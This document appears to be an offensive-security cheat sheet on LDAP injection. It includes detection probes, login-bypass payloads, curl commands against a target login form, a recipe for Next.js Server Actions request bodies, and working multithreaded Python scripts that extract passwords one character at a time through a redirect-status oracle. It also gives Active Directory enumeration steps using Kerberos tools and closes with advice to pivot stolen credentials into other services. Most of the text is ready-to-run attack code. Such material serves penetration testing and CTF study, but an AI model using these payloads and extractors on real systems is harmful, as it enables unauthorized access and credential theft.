# LDAP Injection — Quickstart

LDAP filters are AND/OR/NOT trees of `(attr op value)` clauses. Search endpoints that concatenate user input into a filter accept extra clauses. Common shapes:

- `(&(objectClass=user)(cn=USER_INPUT))` — any web "user search" / list endpoint
- `(&(uid=USER_INPUT)(userPassword=PASS_INPUT))` — login flows (auth bypass)

## Detection

| Probe | Behavior on injectable | Notes |
|-------|------------------------|-------|
| `*` | Returns ALL records | Often blocked or normalized — try first anyway |
| `*)(uid=*` | Returns all records and breaks the filter | Closes the original `cn=...)` early |
| `*)(objectClass=*` | Same | Universal fallback when attribute name unknown |
| `\28` `\29` `\2a` | Server-side decoding (RFC 4515) | Try when `(` `)` `*` are filtered |
| Different result count between `a*` and `z*` | Wildcard is reaching the LDAP filter | Confirms injection |

## Authentication Bypass

`(&(uid=admin)(userPassword=*))` — paste `admin)(uid=*` into the username field and any string into the password.

### Status-code oracle on modern login forms (Next.js Server Actions, etc.)

Even when the login page returns 200 in both success and failure cases, the underlying simple-bind often produces a different *post-action* response. Common pattern: a wildcard `*` in the username field redirects (303 / Location header) when the LDAP search returns ≥1 record, but the same form returns 200 (rendered error template) when the search returns 0 records. That binary distinction is a reliable boolean oracle without any timing dependency.

```bash
# Probe — wildcard expected to match anything in the directory
curl -sk -o /dev/null -w "%{http_code}\n" -X POST https://target/login \
  -d "1_ldap-username=*&1_ldap-secret=x"     # expect 303 if the * reaches the filter
curl -sk -o /dev/null -w "%{http_code}\n" -X POST https://target/login \
  -d "1_ldap-username=zzznosuch*&1_ldap-secret=x"   # expect 200 (no records)
```

Once you have the differential, run the standard prefix-extraction loop (below) using `username_prefix*` per-character probes — each request only differs by one trailing character. ~100 requests per character is normal; parallelise across positions when the form rate-limits per-IP rather than per-account.

#### Next.js Server Actions — multipart-form body shape

Next.js (App Router, 13.4+) uses **Server Actions** on POST forms. The body shape is `multipart/form-data` with these well-known fields plus the actual form inputs:

| Field | Value |
|---|---|
| `$ACTION_REF_1` | empty string |
| `$ACTION_1:0` | JSON: `{"id":"<sha1_of_action>","bound":"$@1"}` |
| `$ACTION_1:1` | `[{}]` |
| `$ACTION_KEY` | `k<digits>` (changes per build/respawn) |
| _(your form fields)_ | e.g. `ldap-username`, `ldap-secret` |

The `id` (40-char sha1) is stable across requests but identifies which server action runs — different forms will have different IDs. Extract both `id` and `key` from a fresh `GET /<page>`:

```bash
# Extract action metadata (one-shot — values change between deploys)
ACTION_ID=$(curl -sk "https://target/login" | grep -oE '"id":"[a-f0-9]{40}"' | head -1 | cut -d'"' -f4)
ACTION_KEY=$(curl -sk "https://target/login" | grep -oE 'k[0-9]{6,}' | head -1)

# Probe with curl multipart — IMPORTANT: must be multipart, NOT urlencoded
curl -sk -o /dev/null -w "%{http_code}\n" "https://target/login" \
  -F "\$ACTION_REF_1=" \
  -F "\$ACTION_1:0={\"id\":\"$ACTION_ID\",\"bound\":\"\$@1\"}" \
  -F "\$ACTION_1:1=[{}]" \
  -F "\$ACTION_KEY=$ACTION_KEY" \
  -F "ldap-username=*" \
  -F "ldap-secret=*"
```

Failure mode if you forget the `$ACTION_*` fields: the action handler refuses to dispatch and returns the rendered form (no LDAP call happens). The 303-vs-200 oracle only fires when the action actually executes — verify by sending a known-bad probe first.

Python parallel extractor (much faster than curl in a shell loop):
```python
import requests, concurrent.futures, string
ACTION_ID = "..."  # 40 hex chars
ACTION_KEY = "k..."
def probe(prefix):
    r = requests.post("https://target/login", verify=False, allow_redirects=False, files={
        "$ACTION_REF_1": (None, ""),
        "$ACTION_1:0":   (None, '{"id":"'+ACTION_ID+'","bound":"$@1"}'),
        "$ACTION_1:1":   (None, "[{}]"),
        "$ACTION_KEY":   (None, ACTION_KEY),
        "ldap-username": (None, "<known_user>"),
        "ldap-secret":   (None, prefix + "*"),
    })
    return r.status_code  # 303 = match, 200 = no match
def find_next(known):
    with concurrent.futures.ThreadPoolExecutor(max_workers=18) as ex:
        for c, code in zip(string.ascii_letters+string.digits,
                           ex.map(lambda c: probe(known+c), string.ascii_letters+string.digits)):
            if code == 303: return c
    return None
```
16-char alphanumeric password extracts in <30 seconds with 18-thread parallelism.

## Blind Boolean Extraction (the high-yield pattern)

Many real apps put the user input inside a `cn=...*` style search and only filter syntactically dangerous chars (`(`, `)`, `=`, `*`) — but allow `*` because it's the legitimate prefix wildcard. When you control a *prefix* wildcard, you can chain a second clause via the wildcard itself:

```
(&(objectClass=user)(cn=admin*)(description=PREFIX*))
                              ^-- injected via the trailing *
```

The server returns the user iff `description` starts with `PREFIX`. Loop the alphabet over each position to extract the value char-by-char.

### Charset and end-of-string sentinel

```python
charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{};:,./<>?"
known = ""
while True:
    found = None
    for c in charset:
        # Encode special chars per RFC 4515: ( ) * \ NUL → \28 \29 \2a \5c \00
        probe = ldap_escape(known + c)
        if request_returns_hit(f"admin*)(description={probe}*"):
            found = c; break
    if found is None:
        # End-of-string detection: nothing extends → check if value is exactly `known`
        if request_returns_hit(f"admin*)(description={ldap_escape(known)})"):
            print("DONE:", known); break
        raise RuntimeError("character not in charset — extend it")
    known += found
```

The `**` pattern (literal star, then wildcard) does NOT work — `*` is the only wildcard and adjacent stars collapse. Use a non-wildcard exact-match clause `(description=KNOWN)` to confirm end-of-string.

## Useful attributes to probe blind

`description`, `info`, `userPassword` (sometimes readable on misconfigured servers), `mail`, `sAMAccountName`, `unicodePwd` (rarely), `homeDirectory`, `comment`. AD-specific: `msDS-KeyCredentialLink`, `servicePrincipalName`. Anything writable to admins ends up holding cleartext on real engagements.

### `userPassword` prefix-wildcard leak via the login filter itself

When the login handler uses an *equality / compare* filter rather than a real LDAP `bind` — typical of demo apps and tutorial code:

```
(&(uid=USER_INPUT)(userPassword=PASS_INPUT))
```

…and the directory stores `userPassword` cleartext (CTFs, legacy systems, misconfigured slapd), prefix-wildcards in the password field leak the password by character. No separate search endpoint required:

```
username=<known_user>  password=H*    → success oracle fires
username=<known_user>  password=HT*   → success oracle fires
username=<known_user>  password=HTX*  → fails
```

Loop the alphabet over each position (same charset / end-of-string sentinel as the `description=` extractor above). Cap concurrency at ~10 threads — higher rates often crash the backend. Combine with the status-code-oracle probe pattern (line 22) to detect the boolean.

`userPassword` is rarely directory-readable on real LDAP — it's the highest-value target on misconfigured demo / CTF / legacy servers.

## Extraction hardening

- Many servers cap results at 1000 — narrow the outer clause (`cn=admin*` not `cn=*`) so the boolean signal isn't drowned in noise.
- HTTP-level signal: response length, status code, presence of a known username in the rendered HTML. Pick the most stable boolean before extraction.
- Rate-limit + jitter: blind LDAP is chatty (~100 requests per character). Parallelise across positions only if the filter exposes one user record per match.
- Server-side filter normalization sometimes lowercases input — if all-letters extraction succeeds but mixed-case fails, the server is lower-casing.

## Blind LDAP injection against Active Directory (login-form SSO)

When the injectable endpoint is an AD-backed login (`(&(sAMAccountName={input}))` then a separate `bind`), several traps waste hours if not handled up front:

**1. Nail the oracle's THREE states before extracting — not two.** A login form typically has:
- *match* (filter returned ≥1 entry; the app then attempts a bind that fails) — e.g. body "Login attempt failed"
- *no-match* (filter returned 0; no bind attempted) — e.g. "Invalid login attempt"
- *error/expired-token* (HTTP 500 / short page / anti-forgery reject)

The match/no-match messages are counter-intuitive: "**login attempt failed**" usually means *the username is VALID and a bind was tried* (i.e. filter MATCHED), while "**invalid login attempt**" means *user not found* (no match). Verify with a known-real vs known-fake username first. Treat the error state as "re-warm token and retry," never as a boolean value — conflating it with `false` produces silent wrong results.

**2. Leave the FINAL injected clause's paren OPEN.** The app's original filter supplies the trailing `)`(s). Inject `*)(attr=val` (open), not `*)(attr=val)` (closed). Closing it yourself unbalances the real filter → parse error → looks like no-match. Confirm an entry exact-matches by pairing with an open sentinel clause: `*)(sAMAccountName=user)(objectClass=user` (open), not a lone `*)(sAMAccountName=user)`.

**3. AD string attributes are `caseIgnoreMatch` — you CANNOT recover a password's case from them.** `description`, `info`, `userPrincipalName`, `displayName` etc. all match case-insensitively. If a leaked `description` looks like a password, the case is unrecoverable via LDAP: `caseExactMatch` (OID `2.5.13.5`) extensible filters (`(description:2.5.13.5:=Value)`) are NOT supported on these AD attributes. Do not burn the account's `badPwdCount` brute-forcing the case-space — that locks the account and is brute force. A "change this password" / leetspeak `change*th1s_p@ssw()rd!!`-style value in `description` is almost always a **decoy note**, not the live credential — verify once with `getTGT.py` (exact bytes, no shell mangling of `!! () @`) and move on.

**4. Read numeric attributes with `>=` / `<=`.** `(logonCount=0` finds never-logged-in accounts (still on their initial/default password); a single account with `logonCount>=1` is the live/service account worth focusing on. Same for `badPwdCount`, `pwdLastSet`. These are case-immune.

**5. The injection scope = the bind account's read rights, usually ONE OU.** Probe `objectClass=computer/group/contact`, `sAMAccountName=Administrator/krbtgt` to map the ceiling. Absent SPN/`msDS-KeyCredentialLink`/LAPS/gMSA/delegation = no in-band privesc pivot from reads alone.

**6. Enumerate accounts OUTSIDE the OU via Kerberos pre-auth** (`GetNPUsers.py <dom>/ -usersfile list -no-pass`, "doesn't have UF_DONT_REQUIRE_PREAUTH" = exists, "PRINCIPAL_UNKNOWN" = not). On a kerberos-only / NTLM-disabled DC this is the only way to confirm service accounts like `iis_webserver`, `Administrator`, app-pool identities the web filter's bind account can't see. Watch for fake "machine" users: a `name$` account with `sAMAccountType=805306368` (user) and `objectClass=computer`=false is a regular user, not a computer — no SPN/RBCD value.

## Filter Operators Quick Reference

| Operator | Syntax | Use |
|----------|--------|-----|
| AND | `(&(A)(B))` | Combine clauses |
| OR | `(\|(A)(B))` | Match either |
| NOT | `(!(A))` | Negate (useful for end-of-string: `(!(description=*KNOWN*))`) |
| Equals | `(attr=value)` | Exact match |
| Substring | `(attr=*v*)` | Contains (and prefix/suffix variants) |
| Approx | `(attr~=value)` | Soundex match (rare) |
| GE/LE | `(attr>=v)` `(attr<=v)` | Useful for numeric blind probes |

## Escaping (RFC 4515)

`(` → `\28` `)` → `\29` `*` → `\2a` `\` → `\5c` NUL → `\00`. Encode characters in the *injected* portion if the application encodes them; leave them raw if the application passes input straight through. Double-encode (`%5c28` etc.) when the framework URL-decodes once.

## Checklist for any LDAP-backed search endpoint

1. Differentiate-result test (`a*` vs `z*`) to confirm wildcard reaches the filter.
2. Fingerprint allowed metacharacters — try `(`, `)`, `*`, `\28`, `\29`, `\2a`.
3. Find a stable boolean (response length / hit count / HTML presence).
4. Decide what attribute holds the secret (description first — it's the canonical cleartext-leakage attribute).
5. Extract char-by-char with charset + end-of-string sentinel.
6. Pivot creds into the application/service the LDAP backs.
